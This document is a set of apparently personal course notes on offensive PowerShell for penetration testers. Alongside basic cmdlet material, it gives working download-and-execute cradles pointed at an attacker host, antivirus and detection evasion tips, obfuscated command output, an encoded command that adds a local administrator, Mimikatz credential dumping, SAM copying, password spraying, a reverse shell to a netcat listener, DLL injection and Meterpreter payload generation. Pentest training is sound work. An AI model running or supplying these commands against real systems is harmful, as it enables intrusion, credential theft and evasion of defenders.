# PowerShell for Pentesters

## Course Introduction

### Course Topic Overview

- PowerShell Fundamentals
- PowerShell for Pentesting
	- Download and Execution (with Net.WebClient)
	- PowerShell Code Obfuscation (with Invoke-Obfuscation)
	- Information Gathering and Reconnaissance with PowerShell (with Invoke-Portscan, Get-HttpStatus, Invoke-ARPScan)
	- Post-Exploitation with PowerShell (with Nishang, PowerSploit, psgetsystem)
	- Metasploit to Create PowerShell Payloads
	- UAC Bypass with PowerShell Script
	- Leveraging WMI for Persistence (with Get-WmiObject, Invoke-WmiMethod, PowerLurk)
	- PowerShell-Empire for Persistence
	- Windows Black-Box Penetration Test (with Nmap, Metasploit, PowerShell-Empire, proxychains)
- Antivirus Evasion (with Shellter)

### Prerequisites

- Basic familiarity with TCP/UDP
- Basic familiarity with Windows

### Learning Objectives

- You will get an introduction to PowerShell.
- You will have an understanding of the inner workings of PowerShell and the various components that make up the language.
- You will be able to write your own PowerShell scripts for automation.
- You will be able to utilize PowerShell for exploitation and post-exploitation.
- You will be able to utilize PowerShell for antivirus evasion and obfuscation.

---
---

## Introduction to PowerShell

### Why PowerShell? - Theory

#### Why PowerShell?

Powershell is a powerful built-in shell and scripting environment we can utilize as penetration testers considering its *wide-spread availability* on all modern Windows-based systems.

The use of PowerShell allows us to take advantage of the *living-off-the-land* concept, where using tools that are built-in to the Operating System work to our advantage once we've obtained the access to a system.

There are many advantages to using Powershell as it relates to penetration testing, with some of them being:
- Many organizations aren't actively hunting for Powershell activity since it is usually considered a *trusted* application. We can use it to bypass application whitelisting implementations by running the usual operating system commands from the Powershell CLI.
- We can use Powershell to run, download or execute code, entirely *within the memory process* of the Powershell executable, helping us evade endpoint security solutions.
- We can use it to interface with the *.NET* and other *Windows APIs*.
- We can call *Windows DLL functions* from within Powershell.
- Many tools are already available to us for a large number of purposes related to penetration testing.

[**PowerSploit**](https://github.com/PowerShellMafia/PowerSploit) is a collection of PowerShell scripts typically used by penetration testers for enumeration, discovering, post-exploitation, privilege escalation, credential access, and so on.

**Windows Management Instrumentation (WMI)** is a management framework in Windows operating systems that provides infrastructure for managing and monitoring system components and services. It allows administrators to access and manipulate information about Windows systems through various tools, scripts, and applications. WMI is utilized for tasks such as collecting system information, automating management tasks, analyzing network configurations, and executing commands remotely across a network of Windows computers.

---

## PowerShell Fundamentals

### The PowerShell CLI - Theory

#### The PowerShell CLI

The PowerShell CLI provides us with access to built-in cmdlets, modules, functions, features, and provides a way to create tasks, functions, variables interactively, and more, directly from the CLI.

A note regarding 32-bit and 64-bit PowerShell executables:
- If you're operating on a 64-bit system, the location of the 64-bit PowerShell executable can be found in `C:\windows\system32\WindowsPowerShell`.
- While the 32-bit version being located in the `C:\windows\SysWOW64\WindowsPowerShell` directory.
This can be a bit confusing considering the directory naming convention.

`[Environment]::Is6BitProcess` to determine if we are running on a 32-bit or a 64-bit PowerShell environment.

When possible, we should try and launch PowerShell as the Administrator user as this will give us access to functions which we would be otherwise unable to access as a Lower-Privileged user.

##### Basic Usage

- `/?`, `-Help`, `-?`: to show the available PowerShell set of command line options.

- `powershell.exe -ExecutionPolicy`: determines which scripts if any, we can run and can easily be disabled with the `Bypass` or `Unrestricted` arguments.
Example: `powershell.exe -ExecutionPolicy Bypass .\script.ps1`.
Example: `powershell.exe -ExecutionPolicy Unrestricted .\script.ps1`.
If there is an execution policy specific to PowerShell on the system that you are working on, you can bypass it or set the global execution policy to unrestricted.
This is a security feature that is in place in Windows, to prevent unintented execution of PowerShell scripts.

- `-WindowStyle`: hides the Powershell window when used with the `Hidden` argument.
Example: `powershell.exe -WindowStyle Hidden .\script.ps1`.
This can be used to prevent the user from knowing that a PowerShell script was being executed.

- `-Command`: is used to specify a Command or Script Block to run.
Example: `powershell.exe -Command Get-Process` to get a list of the current running processes.
Example: `powershell.exe -Command "& { Get-EventLog -LogName security }"`.

- `-EncodedCommand`: is used to execute base64 encoded scripts or commands.
Example:
`$command = dir "c:\program files"`,
`$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)`,
`$encodedCommand = [Convert]::ToBase64String($bytes)`,
`powershell.exe -EncodedCommand $encodedCommand`.

- `-NoProfile`: to avoid the loading of any PowerShell profile.
Profiles are essentially scripts that run when the PowerShell executable is launched and can interfere with our
operations.
Example: `powershell.exe -NoProfile .\script.ps1`.

- `-Version`: followed by a version number as the argument to downgrade the version of PowerShell.
Useful in scenarios where you've landed on a machine with a more recent version and need to downgrade to Version 1.0 or 2.0 or to complete certain tasks.
Requires that older versions are still installed on the target.

Furthermore, all of the PowerShell.exe command line parameters, as well as their arguments, can also be abbreviated, as long as the abbreviations are unique, and additionally, are not required to be case-sensitive either.
Example: `powershell.exe -ExecutionPolicy Bypass`, `powershell.exe -ep Bypass`, `powershell.exe -ex by`.
Example: `powershell.exe -EncodedCommand`, `powershell.exe -enco`, `powershell.exe -ec`.

**Get-Help**

An extremely useful feature of the PowerShell CLI is the `Get-Help` cmdlet.
Similar to Unix `man` pages, we can call upon the `Get-Help` command to obtain information related to any function, alias, module or cmdlet that PowerShell is aware of.
Example: `powershell.exe Get-Help Get-Process -Full` or `powershell.exe Get-Help Get-Process -Online`.
Example: `powershell.exe Get-Help Get-Process -Examples` to get examples on how to use a specific cmdlet.

**Get-Command**

The `Get-Command` cmdlet allows us to list all cmdlets, aliases, functions, workflows, filters, scripts and any applications that are available for us to use in PowerShell.
Example: `powershell.exe Get-Command -Name *Firewall*` to list all functions related to modification of Windows Firewall.

### PowerShell Cmdlets - Theory

#### Cmdlets

Cmdlets are:
- Light-weight PowerShell scripts that perform a single function (can be as small as a few lines of code).
- Instances of .NET Framework classes derived from the "Cmdlet Base Class" and provide access to system functions.
- Cmdlets are native commands in PowerShell (we can also create our own).

They are typically written in a "Verb-Noun" format which helps us determine their function (e.g. `Invoke-Command`).

Every cmdlet has its own set of parameters which can be discovered through the `Get-Help` cmdlet as we've seen previously.
It should be noted that most cmdlets, by default, when run without other parameters will return a limited set of information or columns.
Example: `Get-ChildItem` returns just four columns, `Get-ChildItem | Format-List *` returns all of the information (properties) associated with the returned objects, in a list-like format.

##### Pipelining

The results of all cmdlet output, are usually referred to as "objects".
These objects can be further processed using what is known as "pipelining", similar to how we can chain commands together in a Linux bash shell for instance with the pipe operator `|`.
Example: `Get-Process | Sort-Object -Unique | Select-Object ProcessName, Id`.
Example: `Get-Process chrome, firefox | Sort-Object -Unique | Format-List Path`.

We can also redirect the results of our pipeline operation to a file using a standard redirect operator `>`:
Example: `Get-Process | Sort-Object -Unique | Select-Object ProcessName > uniq_procs.txt`.

##### Useful Cmdlets and Usage

- `GetProcess`: will give us a listing of all processes.
Example: `Get-Process firefox | Sort-Object -Unique | Format-List Path`.

- `Get-Service`: will give us a listing of all services.
Example: `Get-Service "s*" | Sort-Object Status -Descending` returns all services starting with `s*` in descending order and sorting by the `Status` property.

- `Get-Alias`: used to find what the aliases are for a specific cmdlet.
Example: `Get-Alias -Definition Get-ChildItem`.
As we can see, the `Get-ChildItem` cmdlet has three aliases: `dir`, `gci`, and `ls`.

- `Get-WmiObject`: used to return information about WMI objects.
Example: `Get-WmiObject -class win32_operatingsystem | Select-Object -Property *` returns all information related to the current operating system.
Example: `Get-WmiObject -class win32_operatingsystem | select -Property * | select Version` returns the version number of the current operating system.
Example: `Get-WmiObject -class win32_service | Format-List *` returns a detailed list of properties for all services with the `win32_service` class.

- `Export-Csv`: used to save information we are gathering to a file in CSV format.
Example: `Get-WmiObject -class win32_operatingsystem | fl * | Export-Csv c:\host_info.csv`.

- `Select-String`: used to scour the system for files containing certain strings.
Example: `Select-String -Path C:\users\user\Documents\*.txt -Pattern pass*` to search for files of a .txt extension within a user's Documents directory, containing the string `pass*` in their contents.

### PowerShell Modules - Theory

#### Modules

A module, in simplest terms, is a set of PowerShell functionalities grouped together in the form of a single file that will typically have a `.psm1` file extension.

The components that can make up a typical module are:
- Any number of powershell scripts (`.ps1`) or other code files such as a managed cmdlet assembly.
- Additional Assemblies, Help files, or scripts.
- A module manifest file.
- A directory which is used to contain all of the above.

There are several different types of modules: script (we'll be working with these for the most part), binary, manifest, dynamic (created dynamically by scripts using the `New-Module` cmdlet).

##### Get-Module

Modules are typically imported into the current PowerShell session.
Example: `Get-Module` to obtain a list of all currently imported modules.
Example: `Get-Module -ListAvailable` to list all modules available to us for importing.

##### Import-Module

As example, let's take a quick look at the popular PowerShell exploitation framework "PowerSploit".

The PowerSploit modules will need to be copied into one of the module paths specified by the `$Env:PSModulePath` PowerShell environment variable.
For our purposes, we'll use the local user's module path, which is in: `C:\Users\<Username>\Documents\Windows PowerShell\Modules`.

`Import-Module PowerSploit`: to import all of the PowerSploit modules into our current session.
`Get-Module`: to see it's now included in our list of currently imported modules.

`Get-Command -Module PowerSploit`: to list all of the PowerSploit associated cmdlets.

### PowerShell Scripts - Theory

#### Scripts

A very basic example of a PowerShell script which takes a file name as an argument would be something like the following:
```powershell
Param(
	[parameter(mandatory=$true)][string]$file
)
Get-Content "$file"
```
Now we can run this script while supplying the name of a file: `.\example.ps1 usernames.txt`.
Alternatively, we could also just create a variable `$file`, and then call the script against our variable, directly from the shell: `$file = "usernames.txt"; .\example.ps1 $file`.

##### Loop Statements

PowerShell allows us to use a number of loop statements for our purposes: for(), foreach(), while(), do {something} while(), do {something} until().
Example: `$services = Get-Service; foreach ($service in $services) { $service.Name }`

**ForEach-Object**

Furthermore, we can use several built-in cmdlets for constructing loop statements.
Example: `Get-Service | ForEach-Object {$_.Name}`: equivalent to the previous example.

**Where-Object**

The `Where-Object` cmdlet allows us to select objects within a collection based on their property values in regard to when used for a loop.
Example: `Get-ChildItem c:\Powershell\ | Where-Object {$_.Name -match "xls"}`.

**PowerShell TCP Port Scanner**

A great example of a useful loop is a TCP port scanner we can create entirely via the shell as a one-liner:
`$ports = (22, 23, 80, 139, 4444); $ip = "192.168.13.250"; foreach ($port in $ports) { try { $socket = New-Object System.Net.Sockets.TcpClient($ip, $port); } catch{}; if ($socket -eq $null) { echo $ip":"$port" - Closed"; } else { echo $ip":"$port" - Open"; $socket = $null; } }`.

### PowerShell Objects - Theory

#### Objects

Objects are essentially a representation of data that is provided as a result of running a cmdlet.
Rather than with other scripting languages where data is output as text most of the time, PowerShell is different in that the data being output originates from classes within the .NET Framework in the form of *objects*.
Objects are partly comprised of collections of properties, along with *methods* that we can use to manipulate the objects.

Each of the objects also has multiple methods that we can use to manipulate a particular object.
`Get-Member` is used to get a list of methods for objects associated with a cmdlet.
Example: `Get-Process | Get-Member -MemberType Method` (e.g. the Kill and Start methods).

We can use pipelining to manipulate objects using their associated methods.
Example: `Get-Process -Name "firefox" | Kill`.

##### Creating .NET Objects

We can use the `New-Object` cmdlet to create an instance of a *.NET Framework object* or *COM object*.
These can be either created as a "Type" of the .NET Framework class using fully qualified names of .NET classes, or we can use the "ProgID" of a COM object.

Example:
```powershell
$webclient = New-Object System.Net.WebClient
$payload_url = "https://attacker_host/payload.exe"
$file = "C:\ProgramData\payload.exe"
$webclient.DownloadFile($payload_url, $file)
```

---

## PowerShell for Pentesting

### Download and Execution (with Net.WebClient) - Theory

The ability to download and execute files on our target systems is a necessary process in our quest to maintain footholds and persistence within a target network.
Being able to do so with tools that are already built-in to the operating system ("living-off-the-land" principle) is even more important as it helps evade endpoint security measures and application whitelisting solutions by using tools that are likely already "trusted".
Additionally, being able to download and execute files with PowerShell is even more advantageous in many cases, since we're able to operate entirely within the memory process of PowerShell and can avoid dropping artifacts to disk in many cases.

There are two primary ways we can download and execute code in regard to strictly using PowerShell:
1. An executable or script is *downloaded to disk*, which can then be executed by PowerShell itself, or by using other executables on the system to execute our code. `Net.WebClient DownloadFile` method.
2. An executable or script is *downloaded and run within the PowerShell process memory* and never touches the disk (preferred method). `Net.WebClient DownloadString` method.

These two methods (in-memory and disk-based) are usually accomplished using what are commonly referred to as "Download Cradles", and use the `System.Net.WebClient` .Net System class.
The `New-Object` cmdlet allows us to create instances (objects) of either .Net or COM objects.

#### Net.WebClient DownloadFile

**Net.WebClient DownloadFile** method (disk-based).

Although noisy and not recommended if trying to remain stealthy, it's still sometimes a handy method to quickly download a file to the target system.

Executing the file once it's on our target system can be accomplished using the call operator (`&`) and variable we created for the payload (`$local_file`):
```
$downloader = New-Object System.Net.WebClient
$payload = "http://<AttackerIP>/payload.exe"
$local_file = "C:\programdata\payload.exe"
$downloader.DownloadFile($payload, $local_file)
& $local_file ←
```

It should also be noted that the `Net.WebClient` class methods can be configured to use the systems' proxy and default credentials with the following commands:
```
$downloader = New-Object System.Net.WebClient
$payload = http://<AttackerIP>/script.ps1
$cmd = $downloader.DownloadFile($payload)
$proxy = [Net.WebRequest]::GetSystemWebProxy() ←
$proxy.Credentials = [Net.CredentialCache]::DefaultCredentials ←
$downloader.Proxy = $proxy ←
iex $cmd
```

#### Net.WebClient DownloadString

**Net.WebClient DownloadString** method (in-memory).

Example:
```
iex (New-Object Net.Webclient).DownloadString("http://<AttackerIP>/script.ps1")
```
We can run the same command from a standard Windows command prompt ("cmd.exe"):
```
powershell.exe iex (New-Object Net.Webclient).DownloadString('http://<AttackerIP>/script.ps1')
```
Note the difference between the use of single and double quotes.

**Evasion Tips**.

It should be noted that where possible when hosting your remote PowerShell script, to have an *SSL certificate* configured on the attacker machine. This helps in evading over-the-wire heuristics as our traffic will go over HTTPS.

Another trick we can use which might help in evading basic file extension heuristics is to give our PowerShell script a different *file extension* (e.g. "logo.gif"). PowerShell will still execute it as a `.ps1` script.

The `Net.WebClient` class allows us to specify a custom *User-Agent* string (with the `Headers.Add` method) when sending the request to our attacker URL. This can help us evade detection mechanisms that are flagging on abnormal user-agent strings crossing the wire.

#### Net.WebRequest

**Net.WebRequest** class (in-memory).

Aside from the `Net.WebClient` class, we can also use the Net.WebRequest class to download and execute scripts on a target, in memory.

Example:
```
$req = [System.Net.WebRequest]::Create("http://<AttackerIP>/script.ps1")
$res = $req.GetResponse()
iex ([System.IO.StreamReader]($res.GetResponseStream())).ReadToEnd()
```

Similar to the `Net.WebClient` class, the `Net.WebRequest` class can also be configured to use a proxy.

#### Xml.XmlDocument

**Xml.XmlDocument** class (in-memory).

The `System.Xml.XmlDocument` class allows us to execute a PowerShell command (or any system command) contained within an attacker hosted XML document and is another great way to execute code in memory, and in a way that is likely not detected, especially when combined with a server over HTTPS.

Example:
```xml
<?xml version="1.0"?>
<command>
    <a>
        <execute>Get-Process</execute>
    </a>
</command>
```
The above xml file will simply list the system processes when executed:
```
$xmldoc = New-Object System.Xml.XmlDocument
$xmldoc.Load("http://<AttackerIP>/file.xml")
iex $xmldoc.command.a.execute
```

With all of these examples, when executing the download cradles, make sure to include the `-ExecutionPolicy Bypass` and `-Window Hidden` options. This will ensure we can run our scripts and that the powershell window stays hidden from the end-user. `powershell.exe -ExecutionPolicy bypass -Window hidden .\downloader.ps1`.

#### Invoke-CradleCrafter

[**Invoke-CradleCrafter**](https://github.com/danielbohannon/Invoke-CradleCrafter) is a great tool to craft obfuscated download cradles.

### PowerShell Code Obfuscation (with Invoke-Obfuscation) - Theory

**Obfuscation** refers to the process of concealing something important, valuable, or critical. Obfuscation reorganizes code in order to make it harder to analyze or RE.
As a penetration tester, you will find yourself working with PowerShell code frequently. Most AV solutions will immediately flag malicious PowerShell code, as a result, you must be able to obfuscate/encode your PowerShell code and scripts in order to avoid detection.

As endpoint security solutions catch up with attacker methods and implement numerous heuristics and detection signatures to catch PowerShell commands as they're being executed, we turn to obfuscation as a layer in helping us evade those defenses.

#### Invoke-Obfuscation

[**Invoke-Obfuscation**](https://github.com/danielbohannon/Invoke-Obfuscation) is one of the more well-known frameworks we can use for this purpose.
Once we download and extract the "Invoke-Obfuscation" package into our modules directory (i.e. `C:\Users\<Username>\Documents\Windows PowerShell\Modules`) into a folder called "Invoke-Obfuscation", we should be able to import it into our current PowerShell session: `Import-Module Invoke-Obfuscation` and run it with `Invoke-Obfuscation`.

We have several different options we can use to obfuscate our PowerShell commands:
- TOKEN - Obfuscate PowerShell command Tokens
- AST - Obfuscate PowerShell Ast nodes (PowerShell 3.0 and greater)
- STRING - Obfuscate entire command as a String
- ENCODING - Obfuscate entire command via Encoding
- COMPRESS - Convert entire command to one-liner and Compress
- LAUNCHER - Obfuscate command args w/Launcher techniques (run once at end).

First, in order to tell what we'd like to obfuscate exactly, we first need to use the `SET SCRIPTBLOCK` command.
Example:
```
SET SCRIPTBLOCK iex (New-Object Net.Webclient).DownloadString("http://<AttackerIP>/Get-ProcessPaths.ps1")
```

*STRING method*.

Example:
`STRING`, `REVERSE`: to first concatenate our PowerShell command line and then reverse the entire string.
Example output:
```
$Lqi70 ="NoisseRpXE-EKOvnI )43] rahc [ f- ) ') ' + ' } 0 ' + '{1'+'sp.sh'+'taPsse'+'corp- '+'x'+'ei' (("; teG/26.31.'+' 8' + '61 '+' .291/'+'/: '+'p'+'tt'+'h}0{('+'g'+'n'+'irtsdao'+'lnwo'+' d'+'.) '+'tneilcb'+'e'+'W.teN'+' tce'+'jb0-weN'+'('+' [STRING]: JOIN( '' ,$Lqi70[ -1.. -($Lqi70.1ENGTH ) ]) | IeX
```

*ENCODING* method.

Example:
`RESET`, `ENCODING`, `SPECIAL CHARACTERS`: this return a heavily obfuscated string.
Example output:
```
+ {(*~}${-}${)} }$+{[)}${*}${x}${~*)}$ $ + {*}${-}${~*)}$+ +{+$!}${[)}${x}${~*)}$+{* }${* }${~*)}$ + {+$!}${* }${~*)}$__+{x}${[)}${x}${~*)}$+{+}${+$·}${~x)}$+{(}${ -}${~*)}$ +{(}${*}${*}${~*)}$ + |-}$ ]. ({}® )$„ + [ {[)}$]„(_{}@__ )$.+_[_ „{0}${*}$.]. ( { }©)$. +[„{-}${*}$._].({}® )$.) ̄.. @{\___}___)"[${+}]___+"$(@{___})"["${*}"+"${ *}" ]+"$( @{})"[___"${``}"+__"${(]}"]+"$?"[${*}____] + "]" _;${;}= '}= ++ ${;} ; ${)}=++${;} ;${+}= ++ ${;}; ${;$+}=++ ${;} ; ${ *}=++${;} \; ${(*~} ="[" + "$( ${;}___;___${``. ${;} =+$()__;${(]}=_${;}___;___${*}=__++${;}___;${``} = ++${;};${ $}__=++${;}___;___${-} =++ }___]+___"$? ̈[${*}]+"$(@{})"[___${_$} _])_;_${;}= "$( @{}___)"[___"${*}"+"${-}"]+__"$(__ @{___})"[${-}]+"${;}"[
```

If we're operating from a Windows command prompt ("cmd.exe") on the target, instead of a PowerShell console, we can use the `powershell.exe -Command "<PowerShellCommand>"` option to run our obfuscated commands, just encapsulate the result with quotes.

*LAUNCHER* option.

In addition to obfuscating our PowerShell commands, we can also create obfuscated launcher commands to run our obfuscated code on the target using the `LAUNCHER` option.

Example:
`LAUNCHER`, `RUNDLL`, `0` for no execution flags. 
The resulting string, is an obfuscated command that utilizes `rundll32.exe` with the `SHELL32.DLL` function (`ShellExec_RunDLL`) which will launch our obfuscated powerShell code on the target.

#### Base64 Encoding

Although not really a recommended obfuscation method since it can be easily detected by Antivirus and other string heuristics, considering it's just base64 encoding, is PowerShell's `-EncodedCommand` parameter. It allows us to execute encoded commands or script blocks which contain characters which might interfere with the processing of our command via a Windows command prompt.
In simpler terms, it makes complex commands *digestible by PowerShell* by encoding everything with Base64.

Example:
```
$command = 'net user adminl "p@ssword9001" /ADD; net localgroup administrators adminl /add'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
```
We can then get the results of our encoded command with `Write-Host $encodedCommand`.
We then execute our encoded command with `powershell.exe -encodedCommand <EncodedCommand>`.

### PowerShell Code Obfuscation (with Invoke-Obfuscation) - Lab

#### Lab Environment

[**Invoke-Obfuscation**](https://github.com/danielbohannon/Invoke-Obfuscation) is an open source PowerShell v2.0+ compatible PowerShell command and script obfuscator.

#### Lab Solution

To install and set up Invoke-Obfuscation:
`git clone https://github.com/danielbohannon/Invoke-Obfuscation.git`,
`sudo apt install powershell -y`, `pwsh`,
`cd ./Invoke-Obfuscation`, `Import-Module ./Invoke-Obfuscation.psd1`.

We need a script to use as text to test. We can take one from [*Reverse Shell Cheat Sheet*](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#powershell).

To obfuscate the code:
`Invoke-Obfuscation`,
`SET SCRIPTPATH ~/Desktop/pwsh_script.ps1`, `AST`, `All`, `1`, and we get the obfuscated version of the PowerShell code.



### Information Gathering and Reconnaissance with PowerShell (with Invoke-Portscan, Get-HttpStatus, Invoke-ARPScan) - Theory

PowerShell, as we've seen, is largely a tool we use for post-exploitation. However, we can also use it to conduct Information Gathering and Reconnaissance as well.

One of our first steps should be the discovery of hosts and port scans on the network we're operating on. We can do port scans with a one-liner like the following, without requiring any third-party modules.
Example:
```
$ports=(80,8080,443,22); $ip="1.1.1.1"; foreach ($port in $ports) { try{ $socket=New-Object System.Net.Sockets.TcpClient($ip, $port); } catch{}; if ($socket -eq $null) { echo $ip":"$port" - Closed"; else { echo $ip":"$port" - Open"; $socket = $null; } }
```

#### Invoke-Portscan

[**Invoke-Portscan** cmdlet of the **PowerSploit** framework](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon/Invoke-Portscan.ps1) is a tool we can use for efficient discovery of hosts on a network.
`Invoke-Portscan -Hosts <TargetCIDRIPRange> -PingOnly` or `Invoke-Portscan -HostFile <TargetIPsFile> -PingOnly`: to execute a ping scan.
`Invoke-Portscan -Hosts <TargetCIDRIPRange> -PingOnly | Export-Csv C:\ping_scan.csv`: to save the results in a CSV file.

`Invoke-Portscan -HostFile <LiveIPsFile> -Ports <PortsRange>`: to conduct a port scan.
`Invoke-Portscan -HostFile <LiveIPsFile> -Ports <PortsRange> -oG C:\port_scan.gnmap -f` to outpout the result in a greppable Nmap format.

#### Get-HttpStatus

[**Get-HttpStatus** cmdlet of the **PowerSploit** framework](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Get-HttpStatus.ps1) is a tool we can use for enumerating files and directories on web servers.

It works in conjunction with a dictionary (`-Path`), like other similar tools, and when used in conjunction with the `Where-Object` alias (`?`) will return a list of pages or directories on the web server.
Example:
```
Get-HttpStatus -Target <TargetIP> -Port <TargetPort> -Path <DictionaryPath> | ? {$_.Status -Match "ok"}
```

#### Invoke-ARPScan

[**Invoke-ARPScan** cmdlet of the **Posh-SecMod** framework](https://github.com/darkoperator/Posh-SecMod/blob/master/Discovery/Discovery.psm1) is a tool we can use for host discovery. It may generate fewer alerts than your usual SYN or TCP scan.
Example:
```
Invoke-ARPScan -CIDR <TargetCIDRIPRange>
```

**Posh-SecMod** has several useful cmdlets we can use for host discovery purposes:
- Invoke-ARPScan
- Invoke-DBSQLite3Query
- Invoke-EnumSRVRecords
- Invoke-PingScan
- Invoke-ReverseDnsLookup.

### Post-Exploitation with PowerShell (with Nishang, PowerSploit, psgetsystem) - Theory

#### Nishang

[**Nishang**](https://github.com/samratashok/nishang) is another excellent post-exploitation framework. It brings together some of the best tools from other frameworks, in addition to Nishang-native tools as well.

Within this framework we can find a script for mostly any phase of our post-exploitation with utilities in the following categories.
- ActiveDirectory
- Antak-WebShell
- Backdoors
- Bypass
- Client
- Escalation
- Execution
- Gather
- MITM
- Misc
- Pivot
- Prasadhak
- Scan
- Shells
- Utility.

[*Gather* modules](https://github.com/samratashok/nishang/tree/master/Gather).
These modules will help us get information from our target system locally, that we could potentially use to move laterally for instance.

The `Copy-VSS` cmdlet will attempt to copy the SAM database using the VSS service, and if run on a domain controller, will try and copy the NTDS.dit and contents of the SYSTEM registry hive.
`iex (New-Object Net.Webclient).DownloadString("http://<AttackerIP>/Copy-VSS.ps1"); Copy-VSS`.
This command will copy the contents of the SYSTEM registry hive and the SAM file to the current working directory on the target. These can then be cracked offline.

The `Get-Information` cmdlet will get us a good deal of system information including:
- PuTTY trusted hosts
- PuTTY Saved sessions
- Recently used commands
- Shares on the target machine
- Domain Name
- Content of hosts file
- Running Services Account Policy
- Environment Variables
- Local Users
- Current user details
- SNMP information
- Installed applications
- Local Groups
- WLAN Info

The `Invoke-Mimikatz` cmdlet will dump clear-text credentials (or hashes) from memory.
`iex (New-Object Net.WebClient).DownloadString('http://<AttackerIP>/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds`.

The `Invoke-BruteForce` cmdlet can be used to brute force Active Directory accounts, SQL Server, Web or FTP servers. The great thing about a brute force tool written in PowerShell is that we can execute the attack from our target host as long as we copy a file containing usernames and passwords to our target.
`Invoke-BruteForce -ComputerName targetdomain.com -UserList C:\temp\users.txt -PasswordList C:\temp\pwds.txt -Service ActiveDirectory -StopOnSuccess -Verbose`.
This is also a great tool for executing a password spray attack against Active Directory. Just ensure that your password list contains a single password.

[*Shells* modules](https://github.com/samratashok/nishang/tree/master/Shells).

There are several different shells, both bind, reverse, ICMP, UDP shells, and some more complex rat-type shells we can utilize.

The `Invoke-PowerShellTcp` cmdlet provides an excellent way to obtain a reverse PowerShell shell from our target host back to a netcat listener. Keep in mind that if using this method, take into consideration that the traffic is traversing the wire in cleartext between attacker and target.
Although a great and undetected (by Antivirus) method to get a reverse shell from PowerShell, over-the-wire heuristics (SIEM) may pick up some of the back and forth chatter if that type of solution has been implemented within an organization.
`nc -nlvp 4444`: first fire up a netcat listener on our attacker machine.
`powershell.exe -Command iex (New-Object Net.WebClient).DownloadString('http://<AttackerIP>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <ListenerIP> -Port 4444`.

#### PowerSploit

[**PowerSploit**](https://github.com/PowerShellMafia/PowerSploit) is another great information gathering and post-exploitation framework.

As with other frameworks, there are several categories in PowerSploit we can use for our post-exploitation purposes.
- AntivirusBypass
- CodeExecution
- Exfiltration
- Mayhem
- Persistence
- Privesc
- Recon
- ScriptModification.

[*PrivEsc* module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc).

The `PowerUp` script offers a good starting point in the identification of misconfigurations which could lead to privilege escalation.
`dir C:\Modules\PowerSploit\Privesc`, `Import-Module .\Privesc.psml`: to import the Privesc.psm1 module from within the Privesc modules directory.
`Get-Command -Module PrivEsc`: to have a look at some of the options we have.

Of course, we can run any one of those functions or scripts independently, but this module includes an `Invoke-AllChecks` function, that will run all functions related to the Privesc module looking for misconfigurations, permissions issues with services, opportunities for DLL hijacking a number of other useful checks.
`Invoke-AllChecks` or `Invoke-AllChecks -HTMLReport` to save all results to an HTML report file.
The output will also indicate an "AbuseFuntion" we can use to further exploit the target.

[*CodeExecution* module](https://github.com/PowerShellMafia/PowerSploit/tree/master/CodeExecution).

This category in PowerSploit gives us some options in regard to several methods we can inject our own code into existing processes on the target system, whether it be via DLL injection, injecting our own custom shellcode into an existing process, or using WMI to execute commands on the target.

The `Invoke-DLLInjection` script injects an attacker-defined DLL into any existing process ID on the target system.
Example:
`msfvenom -p windows/exec CMD="cmd.exe" -f dll -o /root/Desktop/cmd.dll`: to generate a DLL.
`iex (New-Object Net.Webclient).DownloadFile('http://<AttackerIP>/cmd.dll', 'C:\programdata\cmd.dll')`: to download the DLL onto the target.
`ps | ? {$_. ProcessName -match "notepad"}`: to identify a process on the target system we'd like to inject our DLL into. In this case, we've identified three processes matching the "notepad" string, and we'll choose the one with Pid "7420" for our DLL Injection. 
`iex (New-Object Net.Webclient).DownloadString('http://<AttackerIP>/Invoke- DLLInjection.ps1); Invoke-DLLInjection -ProcessID 7420 C:\programdata\cmd.dll`: to download and execute the `Invoke-DLLInjection` script from our attacker system, along with the correct arguments for injecting our DLL into that existing process.
Once that is complete, if we run the `ps` command again, we can confirm that we now have a  cmd.exe` process which has been spawned from our DLL Injection operation, which is created in a new process thread.

#### psgetsystem

[**psgetsystem**](https://github.com/decoder-it/psgetsystem) is another excellent PowerShell tool.

psgetsystem allows us to get SYSTEM privileges via a parent process, which then spawns a child process which effectively inherits the SYSTEM access privileges of the parent.
Although this tool needs to be run as Administrator, it's a great way to *evade application whitelisting* solutions by being able to inject ourselves into an already signed or other trusted process.

`Get-Process IncludeUserName | Where-Object {$_.UserName -match "SYSTEM"} | Format-List -Property Username,Name,Id`: to identify some SYSTEM processes and choose one we can piggyback onto.

Example:
Now that we have a PID for a SYSTEM-owned process (e.g "3632"), we can instruct psgetsystem to run "cmd.exe" within the SYSTEM-owned "ZeroConfigService" process "3632". As a result, our child process, will also be SYSTEM.
```
.\psgetsys.ps1
[MyProcess]::CreateProcessFromParent(3632, "cmd.exe")
```

In an attack scenario, we could easily launch a Meterpreter executable payload as SYSTEM and get a SYSTEM shell from the target machine.

[**PowerShell-Empire**](https://github.com/BC-SECURITY/Empire) is another great post-expoitation framework.

Its main advantage is that it implements PowerShell functionality without requiring the existence of PowerShell on a target machine.
It is in a world of its own in regard to other frameworks in that it utilizes its own built-in listeners, agents and
modules to compromise and conduct all facets of post-exploitation from information gathering to privilege escalation, lateral movement, persistence, and also integrates with Metasploit framework.

### Metasploit to Create PowerShell Payloads - Lab

**Use Metasploit to create PowerShell payloads**.

`msfconsole -q`, `search multi handler`, `use exploit/multi/handler`, `set PAYLOAD windows/x64/meterpreter_reverse_https`, `show options`, `set LPORT 443`, `set LHOST <AttackerIP>`, `exploit -j`.

`msfvenom -p windows/x64/meterpreter_reverse_https lport=443 lhost=<AttackerIP> -f psh-reflection -o /root/Desktop/payload.ps1`.
`cd /root/Desktop`, `python3 -m http.server 80`.

`powershell iex (New-Object Net.WebClient).DownloadString('http://<AttackerIP>/payload.ps1')`.

`shell`, `powershell`.

**PowerShell extension for Meterpreter**.

This extension allows us to execute PowerShell command strings, import scripts, .NET assembly DLLs.

`load powershell`, `help`.

`powershell_shell`, `Get-Process | Where-Object {$_.ProcessName -match "svchost"}`.

